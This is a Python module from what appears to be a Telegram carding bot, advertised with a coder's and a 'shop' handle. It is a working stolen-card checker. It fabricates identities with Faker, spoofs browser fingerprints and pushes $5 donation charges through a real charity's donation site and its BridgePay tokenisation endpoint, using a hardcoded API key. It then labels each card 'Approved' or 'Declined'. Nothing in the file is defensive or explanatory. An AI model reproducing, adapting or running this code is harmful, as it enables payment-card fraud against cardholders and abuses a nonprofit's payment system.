# ══════════════════════════════════════════════════════════════════════════
#  Coder: t.me/Vxsilisk  -  Shop: t.me/Sxgitario
# ══════════════════════════════════════════════════════════════════════════
import random, re
from faker import Faker
from urllib.parse import quote
import curl_cffi.requests as creq
from Commands.Gates._template import run_gate

_GATEWAY = 'BridgePay CCN'
_f = Faker('en_US')

_name    = lambda: (_f.first_name().replace(' ','').replace('.',''), _f.last_name())
_email   = lambda: f"{_f.user_name()}@{random.choice(['hotmail.com','gmail.com','yahoo.com'])}"
_phone   = lambda: f"512678{random.randint(1111,9999)}"
_street  = lambda n: f"{n}+street+{random.randint(1111,9999)}"


def _flow(num, mes, ano, cvv):
    mes = mes.zfill(2)
    ano = ano[-2:] if len(ano) == 4 else ano

    last = ''
    for _ in range(3):
        try:
            sess = creq.Session(impersonate=random.choice(['safari17_0','safari17_2_ios','safari15_3']))
            ua   = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            fn, ln = _name()
            em, ph, st = _email(), _phone(), _street(fn)

            r1       = sess.get('https://sreedevipeetham.org/donations', timeout=20)
            price_m  = re.search(r'id=["\']price[_\-]?(\d+)["\']', r1.text)
            price_id = price_m.group(1) if price_m else ''
            if not price_id:
                last = 'price_id not found in page'; continue

            hdrs = {'User-Agent': ua, 'Accept': '*/*',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Origin': 'https://sreedevipeetham.org',
                    'Referer': 'https://sreedevipeetham.org/donations'}
            data = (f'ids%5B%5D={price_id}&totalPrice=5&qty%5B%5D=1&ctg%5B%5D=DONATIONS'
                    f'&serviceTypes%5B%5D=GENERAL+DONATIONS&serviceName%5B%5D=Flower+Seva'
                    f'&serviceAmount%5B%5D=5.00&cart_type=DONATIONS&image%5B%5D=%2Fuploads'
                    f'%2Fprofile%2Fimage-1743574229065-48347557.png&description%5B%5D='
                    f'&cart_ctg%5B%5D=DONATIONS&service_desc%5B%5D=&isTextinputBox%5B%5D=')
            r2 = sess.post('https://sreedevipeetham.org/Donations/addCart', headers=hdrs, data=data, timeout=15)
            if 'Country restrictions' in r2.text:
                last = 'Country restrictions blocked'; continue

            data = (f'fname={ln}&lname={fn}&email={quote(em)}&phone={ph}'
                    f'&countryCode=%2B1&checkStatus=2&state=NEW+YORK&city=NEW+YORK'
                    f'&zipcode=10080&address_line1={st}')
            sess.post('https://sreedevipeetham.org/Home/getOrAddCustomer', headers=hdrs, data=data, timeout=15)

            thdrs = {'X-Sending-Script': 'https://www.bridgepaynetsecuretx.com/Bridgepay.WebSecurity/TokenPay/js/tokenPay.js',
                     'X-Tokenpay-Key': 'tokenpay35574api20252007022038330',
                     'X-Requested-With': 'XMLHttpRequest', 'User-Agent': ua,
                     'Accept': '*/*', 'Content-Type': 'application/json',
                     'Origin': 'https://www.bridgepaynetsecuretx.com',
                     'Referer': 'https://www.bridgepaynetsecuretx.com/WebSecurity/TokenPay/js/dataValidator.html'}
            r4 = sess.post('https://www.bridgepaynetsecuretx.com/WebSecurity/TokenPayHandler.ashx',
                           headers=thdrs, json={'number': num, 'expMonth': mes, 'expYear': ano, 'zipcode': ''},
                           timeout=20)
            token = _found(r4.text, '"token":"', '"')
            if not token:
                return {'status': False, 'raise': 'No BridgePay token'}

            data = (f'token={token}&totolAmt=5&name={fn}+{ln}&address={st}'
                    f'&zipcode=10080&general_donation=0&acharya_sambhavana=0')
            r5  = sess.post('https://sreedevipeetham.org/MPI_Payments/Paynow', headers=hdrs, data=data, timeout=20)
            msg = r5.json().get('message', '')
            ok  = any(k in msg.lower() for k in ('success', 'approved', 'transaction successful'))
            return {'status': True, 'success': ok,
                    'response': f"{'Approved ✅' if ok else 'Declined ❌'} | {msg[:120]}"}
        except Exception as e:
            last = str(e)[:180]
    return {'status': False, 'raise': f'Retries exhausted: {last}'}


def _found(html, start, end):
    try:
        s = html.index(start) + len(start)
        return html[s:html.index(end, s)]
    except ValueError:
        return ''


def _checker(cc, binData):
    try:
        return _flow(cc[0], cc[1], cc[2], cc[3])
    except Exception as e:
        return {'status': False, 'raise': str(e)[:200]}


def gateCmd(bot, update, gestion):
    run_gate(bot, update, gestion, gateway=_GATEWAY, checker=_checker)


def run_check(cc, bin_data, ctx=None):
    r = _checker(cc, bin_data)
    if not r.get('status'):
        return {'status': 'Error ⚠️', 'response': r.get('raise', 'Gate error')}
    return {'status': 'Approved ✅' if r.get('success') else 'Declined ❌',
            'response': r.get('response', '')}

# ══════════════════════════════════════════════════════════════════════════
#  Coder: t.me/Vxsilisk  -  Shop: t.me/Sxgitario
# ══════════════════════════════════════════════════════════════════════════
